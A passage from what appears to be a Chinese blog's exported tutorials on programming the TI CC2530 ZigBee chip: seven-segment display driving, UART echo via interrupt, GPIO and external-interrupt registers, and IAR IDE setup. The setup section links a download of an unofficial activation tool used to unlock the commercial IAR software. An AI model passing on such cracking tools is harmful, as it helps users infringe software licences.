class="number">1</span>)</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">         &#123;</span><br><span class="line">            LS164_BYTE(i);<span class="comment">//数码管显示函数，i为几，数码管显示几</span></span><br><span class="line">            <span class="built_in">delay</span>();</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>16M代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iocc2530.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"74LS164_8LED.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delay</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i,j;</span><br><span class="line">     <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">1000</span>;i++)</span><br><span class="line">       <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">800</span>;j++);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="keyword">char</span> i;</span><br><span class="line">     LS164_Cfg();</span><br><span class="line">     <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">         &#123;</span><br><span class="line">            LS164_BYTE(i);</span><br><span class="line">            <span class="built_in">delay</span>();</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外附上74LS164_8LED 数码管显示的代码，把代码添加到工程里即可</p><p>74LS164_8LED.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __74LS164_8LED_H__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __74LS164_8LED_H__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ioCC2530.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  LS164_DATA  P1_3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  LS164_CLK   P1_2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  UCHAR  unsigned char </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LS164_Cfg</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LS164_BYTE</span><span class="params">(UCHAR Data)</span></span>;<span class="comment">//P1.3  DATA   P1.2  CLK</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>74LS164_8LED.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ioCC2530.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"74LS164_8LED.h"</span></span></span><br><span class="line"><span class="keyword">static</span> UCHAR LED_Map[]=&#123;<span class="number">0x3f</span>,<span class="number">0x06</span>,<span class="number">0x5b</span>,<span class="number">0x4f</span>,</span><br><span class="line">                        <span class="number">0x66</span>,<span class="number">0x6d</span>,<span class="number">0x7d</span>,<span class="number">0x07</span>,</span><br><span class="line">                        <span class="number">0x7f</span>,<span class="number">0x6f</span>,<span class="number">0x00</span>,<span class="number">0xFF</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LS164_Cfg</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    P1SEL &amp;=~<span class="number">0x0C</span>;<span class="comment">//xxxx 00xx  配置为普通IO模式</span></span><br><span class="line">    P1DIR |=<span class="number">0x0C</span>;<span class="comment">//xxxx 11xx   配置为输出模式</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LS164_BYTE</span><span class="params">(UCHAR Index)</span> <span class="comment">//P1.3  DATA   P1.2  CLK</span></span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    UCHAR i=<span class="number">0</span>;</span><br><span class="line">    UCHAR Data=LED_Map[Index];</span><br><span class="line">    <span class="keyword">for</span>(;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">0x80</span> &amp; Data)</span><br><span class="line">        &#123;</span><br><span class="line">            LS164_DATA=<span class="number">1</span>;            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            LS164_DATA=<span class="number">0</span>; </span><br><span class="line">        &#125;</span><br><span class="line">        Data=Data &lt;&lt; <span class="number">1</span>;</span><br><span class="line">        LS164_CLK=<span class="number">0</span>;</span><br><span class="line">        LS164_CLK=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="USB转串口配置"><a href="#USB转串口配置" class="headerlink" title="USB转串口配置"></a>USB转串口配置</h1><p>CC2530具备两个串口，且每个串口都可以配置选择控制脚</p><img src="https://i.loli.net/2020/03/26/HfcxDLhyiTaAmGJ.png" alt="image-90.png" style="zoom:67%;" /><img src="https://i.loli.net/2020/03/26/jfCrgsWSFvMJ268.png" alt="image-91.png" style="zoom:67%;" /><p><strong>步骤：</strong></p><p>1、指定串口的IO位置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PERCFG &amp;=<span class="number">0xFE</span>;<span class="comment">//1111 1110 选中串口0的的备用位置1</span></span><br></pre></td></tr></table></figure><p>2、相应IO配置成偏上外设功能</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">P0SEL |=<span class="number">0x0C</span>;       <span class="comment">//0000 1100 P0_2 p0_3为偏上外设功能</span></span><br></pre></td></tr></table></figure><p>3、8个数据位，1个停止位，无流控，无校验确立</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U0CSR |=<span class="number">0Xc0</span>;</span><br></pre></td></tr></table></figure><p>4、波特率设置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">U0GCR =<span class="number">8</span>;</span><br><span class="line">U0BAUD=<span class="number">59</span>;</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2020/03/26/MLroJ9Vljz5AsGm.png" alt="image-95.png" style="zoom: 67%;" /><img src="https://i.loli.net/2020/03/26/rxuZVSNhQG9UEw3.png" alt="image-92-e1579148396866.png" style="zoom:67%;" /><img src="https://i.loli.net/2020/03/26/H8uZ63fPBJlnVec.png" alt="image-94.png" style="zoom:67%;" /><p>5、开CPU中断，对应串口接收中断</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EA=<span class="number">1</span>;</span><br><span class="line">URX0IE=<span class="number">1</span>;<span class="comment">//结尾为0或8则可以直接选择赋值</span></span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2020/03/26/RlY8BjqVZO1TxPt.png" alt="image-93.png" style="zoom:50%;" /><p>USART0接收字符利用中断服务函数</p><ul><li><p>当一个字节由串口接收到C2530，字节会保存到U0DBUF寄存器，同时接收中断标志URX0IF位会置1</p></li><li><p>可以利用中断服务程序来接收该字符串</p></li><li><p>中断服务函数</p><p>#pragma vector = URX0_VECTOR<br>__interrupt void UART0_ISR(void)</p></li></ul><h1 id="总测试代码"><a href="#总测试代码" class="headerlink" title="总测试代码"></a><strong>总测试代码</strong></h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iocc2530.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> ch;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Cfg32M</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SLEEPCMD &amp;=<span class="number">0xFB</span>; <span class="comment">//fB 0 00 让2个时钟源都起振</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">0</span>==(SLEEPSTA &amp; <span class="number">0x40</span>));  <span class="comment">//  0100 0000  如果32M 晶振供电且稳定了，那么程序往下运行</span></span><br><span class="line">    CLKCONCMD &amp;=<span class="number">0xF8</span>; <span class="comment">//1111 1000 不分频输出</span></span><br><span class="line"></span><br><span class="line">    CLKCONCMD &amp;=<span class="number">0xBF</span>;<span class="comment">//1011 1111 让32M作为系统主时钟供给CPU</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>==(CLKCONSTA &amp; <span class="number">0x40</span>));<span class="comment">//如果32M确实供给CPU在工作，那么程序往下执行</span></span><br><span class="line">    SLEEPCMD |=<span class="number">0x40</span>;<span class="comment">// 0000 0100 </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">UartCfg</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//串口0的备用位置1配置成波特率9600</span></span><br><span class="line">   PERCFG &amp;=<span class="number">0xFE</span>;<span class="comment">//1111 1110 选中串口0的的备用位置1</span></span><br><span class="line">   P0SEL  |=<span class="number">0x0C</span>;       <span class="comment">//0000 1100 P0_2 p0_3为偏上外设功能</span></span><br><span class="line">   </span><br><span class="line">   U0CSR |=<span class="number">0Xc0</span>;</span><br><span class="line">   </span><br><span class="line">   U0GCR =<span class="number">8</span>;</span><br><span class="line">   U0BAUD=<span class="number">59</span>;</span><br><span class="line">   EA=<span class="number">1</span>;</span><br><span class="line">   URX0IE=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  Cfg32M();</span><br><span class="line">  UartCfg();</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> vector=URX0_VECTOR<span class="comment">//中断服务函数</span></span></span><br><span class="line"><span class="function">__interrupt <span class="keyword">void</span> <span class="title">UART0_ISR</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    URX0IF=<span class="number">0</span>;<span class="comment">//串口0来数据的标志位，硬件会置1，我们软件要清0</span></span><br><span class="line">    ch=U0DBUF;<span class="comment">//从接受寄存器里取字节存入变量ch</span></span><br><span class="line">    </span><br><span class="line">    U0DBUF=ch;<span class="comment">//把变量ch里的值赋给串口0发送数据寄存器</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">0</span>==UTX0IF);</span><br><span class="line">    UTX0IF=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ZigBee </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ZigBee </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO控制与外部中断</title>
      <link href="/2020/01/14/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/"/>
      <url>/2020/01/14/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/</url>
      
        <content type="html"><![CDATA[<p>CC2530只具备<a href="https://baike.baidu.com/item/QFN%E5%B0%81%E8%A3%85/5168878?fr=aladdin" target="_blank" rel="noopener">QFN</a>40封装 工作范围：2~3.6V(推荐选3.3V)</p><p><img src="https://i.loli.net/2020/03/27/ZMwdHAhqoUvQKiD.png" alt=""></p><p>一共有21个通用IO口，其中这21个分为3组P0\P1\P2； 其中P0\P1组各8个IO，P2组5个（P2_0、P2_1、 P2_2、P2_3、 P2_4）。</p><p>这些口子都可以作为普通或对应的片上外设控制。</p><p>其中P1_0 P1_1有20mA的输出驱动能力，其余的只有4mA</p><p>PxSEL、PxDIR、PxINP Px（x分别对应0、1、2,用来控制对应的IO口组）3种寄存器；复位、默认都是0</p><h1 id="PxSEL寄存器"><a href="#PxSEL寄存器" class="headerlink" title="PxSEL寄存器"></a>PxSEL寄存器</h1><p>PxSEL寄存器作用: 有8位，每一位对应具体的IO组中的相应的一个IO，决定它是普通IO口还是片上外设，0表示普通IO口，1表示片上外设。</p><img src="https://i.loli.net/2020/03/27/xVFm5Zg3o9ESDuy.png" style="zoom:67%;" /><img src="https://i.loli.net/2020/03/27/7tq2ZKGDx4LTWXS.png" style="zoom:67%;" /><h1 id="PxDIR寄存器"><a href="#PxDIR寄存器" class="headerlink" title="PxDIR寄存器"></a>PxDIR寄存器</h1><p>PxDIR寄存器作用: 有8位，每一位对应具体的IO组中的相应的一个IO，决定它是输入还是输出，0表示输入，1表示输出。</p><p>特别注意：其中P2组只有5个IO口，低五位也对应P2_0 … P2_4 后面的位不用管。</p><img src="https://i.loli.net/2020/03/27/rKTvCZlngyzAR2j.png" style="zoom:67%;" /><img src="https://i.loli.net/2020/03/27/JSp5VaAUw1NuxWI.png" style="zoom:67%;" /><h1 id="PxINP寄存器"><a href="#PxINP寄存器" class="headerlink" title="PxINP寄存器"></a>PxINP寄存器</h1><p>PxINP寄存器作用: 在输入的时候，8位，每一位对应具体的IO组中的相应的一个IO，决定它是上下拉模式还是三态，0表示上下拉模式，1表示三态。</p><p>特别注意：其中P2组只有5个IO口，低五位也对应P2_0 … P2_4 ，后面的3位决定在配置为上下拉模式的时候，组为上拉 还是下拉，0表示上拉，1表示下拉。</p><img src="https://i.loli.net/2020/03/27/kxWU8gsLzhBrOc5.png" style="zoom:67%;" /><img src="https://i.loli.net/2020/03/27/GumfEnUdVwZMRcD.png" style="zoom:67%;" /><h1 id="EA"><a href="#EA" class="headerlink" title="EA"></a>EA</h1><p>总CPU开关中断，令其为1则为开关闭合</p><h1 id="PxIE"><a href="#PxIE" class="headerlink" title="PxIE"></a>PxIE</h1><p>组使能位，控制PxIEN</p><p>注意：可以直接令P0IE=1，若要设置P1IE为1，则令IEN2 |=0x10；相当于P1IE=1</p><h1 id="PxIEN"><a href="#PxIEN" class="headerlink" title="PxIEN"></a>PxIEN</h1><p>对应的中断使能标志位，使用方法：PxIEN |= 0x__；为1则为闭合</p><img src="https://i.loli.net/2020/03/27/jBCmSyu5rhx93Dw.png" style="zoom:67%;" /><img src="https://i.loli.net/2020/03/27/1y2DutSjieoKU6k.png" style="zoom: 67%;" /><img src="https://i.loli.net/2020/03/27/mHERnUSbMTWzuwi.png" style="zoom: 67%;" /><h1 id="PICTL寄存器"><a href="#PICTL寄存器" class="headerlink" title="PICTL寄存器"></a>PICTL寄存器</h1><p>0代表上升沿，1代表下降沿。</p><p><img src="https://i.loli.net/2020/03/27/PtWDMy3RNvG84ai.png" alt=""></p><h1 id="PxIFG"><a href="#PxIFG" class="headerlink" title="PxIFG"></a>PxIFG</h1><p>中断状态标志寄存器, 当发生中断时，相应位将被置1</p><p><img src="https://i.loli.net/2020/03/27/3xcXeSzwspgkGOZ.png" alt=""></p><h1 id="中断函数"><a href="#中断函数" class="headerlink" title="中断函数"></a>中断函数</h1><p>pragma vector=PxINT_VECTOR（x=0,1,2）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pragma <span class="built_in">vector</span>=PxINT_VECTOR（x=<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>）</span><br><span class="line">__interrupt  <span class="keyword">void</span>  fn()</span><br><span class="line">&#123;</span><br><span class="line">PxIFG=<span class="number">0</span>; PxIF=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数最后需要将PxIFG和PxIF清零。</p><img src="https://i.loli.net/2020/03/27/4e2fxbMLNBXa9DP.png" style="zoom:67%;" /><p>最后附上一段能够按按钮控制灯亮灭的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iocc2530.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delay</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">int</span> i,j;</span><br><span class="line">   <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">1000</span>;i++)</span><br><span class="line">     <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">30</span>;j++);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">  P0SEL &amp;=<span class="number">0xDF</span>;<span class="comment">// 1101 1111 //P0_5设置为普通IO口</span></span><br><span class="line">  P0DIR &amp;=<span class="number">0xDF</span>;<span class="comment">// 1101 1111 //P0_5设置为输入</span></span><br><span class="line">  P0INP &amp;=<span class="number">0xDF</span>;<span class="comment">// 1101 1111 //P0_5设置为上下拉模式</span></span><br><span class="line">  P2INP &amp;=<span class="number">0xDF</span>;<span class="comment">// 1101 1111 //P0组配置成上拉模式</span></span><br><span class="line">  </span><br><span class="line">  EA=<span class="number">1</span>;<span class="comment">//闭合总CPU</span></span><br><span class="line">  P0IE=<span class="number">1</span>;<span class="comment">//P1IE如果要设置为1，那么我们不能直接用P1IE=1,IEN2 |=0x10;// 0001 0000</span></span><br><span class="line">  <span class="comment">//IEN2 |=0x10;//相当于P1IE=1</span></span><br><span class="line">  P0IEN |=<span class="number">0X20</span>;<span class="comment">// 0010 0000 设置3个中断使能标志位，让相应的中断开关合上</span></span><br><span class="line">  </span><br><span class="line">  PICTL |=<span class="number">0x01</span>;<span class="comment">//把P0这一组配置成下降沿触发//PICTL |=0x02则为把P1组配置成下降沿</span></span><br><span class="line">  </span><br><span class="line">  P1DIR |=<span class="number">0X01</span>;<span class="comment">//配置P1_0位输出</span></span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>);<span class="comment">//死循环，不结束函数</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> optimize=none</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> vector=P0INT_VECTOR</span></span><br><span class="line"><span class="function">__interrupt <span class="keyword">void</span> <span class="title">fsdfas</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(P0IFG &amp; <span class="number">0x20</span>)<span class="comment">// 0010 0000</span></span><br><span class="line">    &#123;<span class="comment">//P0组的第5位 P0_5引发了外部中断</span></span><br><span class="line">        <span class="built_in">delay</span>();</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">0</span>==P0_5)</span><br><span class="line">        &#123;<span class="comment">//说明确实是连接在P0_5的按钮触发了外部中断</span></span><br><span class="line">           P1_0 ^=<span class="number">1</span>;<span class="comment">//异或操作</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    P0IFG=<span class="number">0</span>; </span><br><span class="line">    P0IF=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ZigBee </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ZigBee </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZigBee入门</title>
      <link href="/2020/01/13/ZigBee%E5%85%A5%E9%97%A8/"/>
      <url>/2020/01/13/ZigBee%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<ul><li>学习ZigBee不仅仅是学习控制器本身，还要掌握一堆叫做协议栈的代码和网络的一些相关东西</li></ul><p>ZigBee是无线设备之间的一种通信方式，类似于任人和人之间的普通话交流，普通话就是一种通信方式</p><p>ZigBee，ZigBee通信方式，ZigBee协议这三者没任何区别，只是说法不同而已</p><p>ZigBee的作用就是用于无线模块和模块之间的通信，构建无线局域网</p><p>无线传感网络：如果这个无线局域网用于传感器的数据收集和监控，那么这个网络就叫做无线传感器网络，是无线局域网的一种具体应用</p><p>引入ZigBee通信方式的原因：</p><ul><li>WiFi：通信速率大，功耗大等</li><li>蓝牙：功耗小，组网的节点数较少</li><li>ZigBee：可以组件大规模的网络，功耗低（TI CC2530 正常工作电流8mA，最低工作达到几个uA），缺点为通信速率小，MAX=250KB</li></ul><p>此次使用的是CC2530芯片</p><h1 id="环境的安装和搭建"><a href="#环境的安装和搭建" class="headerlink" title="环境的安装和搭建"></a>环境的安装和搭建</h1><p>工作环境IAR的安装：</p><p><a href="https://pan.baidu.com/s/1YvVTsz7ZBu1c3FSTDQVjVA" target="_blank" rel="noopener">下载链接</a>，提取码：vbzy</p><p>使用注册工具激活：</p><p><a href="https://pan.baidu.com/s/1iCz3AGJwQPoXLJ5Uf5rHwQ" target="_blank" rel="noopener">下载链接</a>，提取码：2c5p</p><p>注意：Win7以上的系统激活的时候需要右键以管理员方式运行软件，否则会在后面的编译代码的过程中出现错误，<a href="https://zhidao.baidu.com/question/447439875.html" target="_blank" rel="noopener">详见链接</a></p><img src="D:\Blog\source\_posts\ZigBee入门.assets\image-31.png" style="zoom:50%;" /><img src="D:\Blog\source\_posts\ZigBee入门.assets\image-32.png" style="zoom:50%;" /><img src="D:\Blog\source\_posts\ZigBee入门.assets\image-33.png" style="zoom:50%;" /><p>如图所示激活操作，其余操作只需next即可</p><h1 id="新建工程文件"><a href="#新建工程文件" class="headerlink" title="新建工程文件"></a>新建工程文件</h1><img src="D:\Blog\source\_posts\ZigBee入门.assets\image-34.png" style="zoom:50%;" /><img src="D:\Blog\source\_posts\ZigBee入门.assets\image-35.png" style="zoom:50%;" /><img src="D:\Blog\source\_posts\ZigBee入门.assets\image-36.png" style="zoom:50%;" /><p>C语言.c文件建立与保存</p><img src="D:\Blog\source\_posts\ZigBee入门.assets\image-37.png" style="zoom:67%;" /><img src="D:\Blog\source\_posts\ZigBee入门.assets\image-38.png" style="zoom:50%;" /><p>将文件添加到工程中：</p><img src="D:\Blog\source\_posts\ZigBee入门.assets\image-43-1024x604.png" style="zoom:50%;" /><p>写入代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iocc2530.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  P1DIR |=<span class="number">0X01</span>;<span class="comment">//让P_0为输出</span></span><br><span class="line">  P1_0=<span class="number">1</span>;<span class="comment">//0为低电平，使二极管发光，1为高电平</span></span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="D:\Blog\source\_posts\ZigBee入门.assets\image-44-1024x604.png" style="zoom:50%;" /><p>点击编译：</p><img src="D:\Blog\source\_posts\ZigBee入门.assets\image-45-1024x604.png" style="zoom:50%;" /><p>在弹出的框框中给工程工作空间命名：</p><img src="D:\Blog\source\_posts\ZigBee入门.assets\image-46.png" style="zoom:50%;" /><p>保存，编译通过</p><img src="D:\Blog\source\_posts\ZigBee入门.assets\image-47-1024x604.png" style="zoom:50%;" /><p>以下为工程目录中各文件的介绍：</p><img src="D:\Blog\source\_posts\ZigBee入门.assets\image-48.png" style="zoom:50%;" /><h1 id="ZigBee仿真器"><a href="#ZigBee仿真器" class="headerlink" title="ZigBee仿真器"></a>ZigBee仿真器</h1><p>仿真与下载程序用到的一种硬件</p><p>需啊在Windows环境下安装驱动才可以使用</p><p><a href="https://pan.baidu.com/s/1cM9o3uMKPdgISDyFvodyMg" target="_blank" rel="noopener">驱动下载链接</a>，提取码：3gbw</p><p>在电脑USB端口插上仿真器，打开设备管理器，右键新加进来的前面有黄色感叹号的标致，点击更新驱动</p><img src="D:\Blog\source\_posts\ZigBee入门.assets\image-49.png" style="zoom:50%;" /><p>点击浏览定位到驱动文件夹，随后下一步安装即可</p><img src="D:\Blog\source\_posts\ZigBee入门.assets\image-50.png" style="zoom:50%;" /><p>随后进行下载操作（即将程序下载到板子里）</p><h1 id="下载前的配置操作"><a href="#下载前的配置操作" class="headerlink" title="下载前的配置操作"></a>下载前的配置操作</h1><img src="D:\Blog\source\_posts\ZigBee入门.assets\image-51-1024x604.png" style="zoom:50%;" /><p>器件选择：</p><img src="D:\Blog\source\_posts\ZigBee入门.assets\image-52.png" style="zoom:50%;" /><p>点击后弹出一个文件夹，此文件夹在IAR软件的安装目录下</p><p>选择–&gt;Texas Instruments–&gt;CC2530F256，打开即可</p><img src="D:\Blog\source\_posts\ZigBee入门.assets\image-53.png" style="zoom:50%;" /><img src="D:\Blog\source\_posts\ZigBee入门.assets\image-54.png" style="zoom:50%;" /><p>Linker连接配置：</p><img src="D:\Blog\source\_posts\ZigBee入门.assets\image-55.png" style="zoom:50%;" /><p>Debugger选择：</p><img src="D:\Blog\source\_posts\ZigBee入门.assets\image-56.png" style="zoom:50%;" /><p>点击OK后即可下载到板子中</p><p>点击顺序如下：</p><img src="D:\Blog\source\_posts\ZigBee入门.assets\image-57-1024x604.png" style="zoom:50%;" /><p>以下为各个图标所代表的含义：</p><img src="D:\Blog\source\_posts\ZigBee入门.assets\image-59.png" style="zoom:50%;" /><h1 id="导出为Hex镜像文件供他人使用"><a href="#导出为Hex镜像文件供他人使用" class="headerlink" title="导出为Hex镜像文件供他人使用"></a>导出为Hex镜像文件供他人使用</h1><p>需要用到SmartRF flash 